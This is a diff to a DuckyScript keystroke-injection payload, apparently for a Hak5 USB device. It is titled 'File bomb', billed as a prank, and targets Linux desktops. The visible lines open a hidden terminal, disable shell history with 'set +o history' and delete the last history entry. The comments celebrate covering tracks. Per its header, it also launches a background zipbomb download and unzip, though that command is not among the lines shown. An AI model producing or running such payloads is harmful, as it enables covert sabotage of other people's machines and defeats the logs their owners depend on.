@@ -1,13 +1,17 @@
-REM FalsePhilosopher
-REM zipbomb i found and thought I would have some fun with
-REM Target linux
+REM Title: File bomb
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, strippers and memes
+REM Version: 1.0
+REM Category: Prank
+REM zipbomb I found and thought I would have some fun with. Covers tracks, opens a background download/unzip, and closes the terminal for no trace.
 DELAY 300
-REM Minimize all windows as that ensures launch happens smoother.
+REM Minimize all windows as that ensures launch happens smoother and when the terminal is launch everything else is relaunched for no trace of funny business.
 WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 1500
-REM cover tracks for sneak +1
+REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the last entry ;)
 STRING set +o history
 DELAY 300
 ENTER
@@ -21,7 +25,7 @@ DELAY 300
 CTRL C
 REM i'm sure there's a better way to do that.
 DELAY 300
-REM sneakyboi
+REM sneak +1 cover your tracks
 STRING history | grep history
 DELAY 200
 ENTER
